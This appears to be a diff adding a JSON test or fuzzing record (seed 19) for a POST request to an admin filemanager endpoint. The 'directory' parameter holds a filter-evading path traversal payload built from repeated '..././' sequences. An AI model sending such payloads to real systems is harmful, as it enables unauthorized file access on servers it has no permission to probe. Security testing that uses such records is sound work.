@@ -1,0 +1,12 @@
+[
+  {
+    "seed": 19,
+    "url": "https://app8.com/upload/admin/index.php?route=common/filemanager/directory&token=xxx",
+    "target": "https://app8.com/upload/admin/index.php?route=common/filemanager/directory&token=xxx",
+    "method": "POST",
+    "params": {
+      "directory": "..././..././..././..././..././..././..././"
+    },
+    "files": null
+  }
+]
